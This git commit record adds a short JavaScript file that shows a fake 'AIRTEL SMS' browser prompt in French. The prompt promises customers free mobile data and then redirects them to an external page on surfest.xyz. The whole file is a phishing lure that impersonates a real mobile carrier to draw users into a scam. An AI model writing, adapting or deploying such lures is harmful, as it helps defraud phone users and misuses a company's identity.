a6f9b3b1c523e18aa49de3bd7b237c709005e1a1
inemitid <asuquodavid021@gmail.com>
2025-05-14 22:49:35 -0700

    Create activation-airteldata.js

---
+++ activation-airteldata.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('AIRTEL SMS: Cher client, veuillez vérifier si votre carte SIM Airtel est éligible pour recevoir de 10 Go à 100 Go de données, récompense pour les anciens clients, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://surfest.xyz/free-airteldata.html';
+}
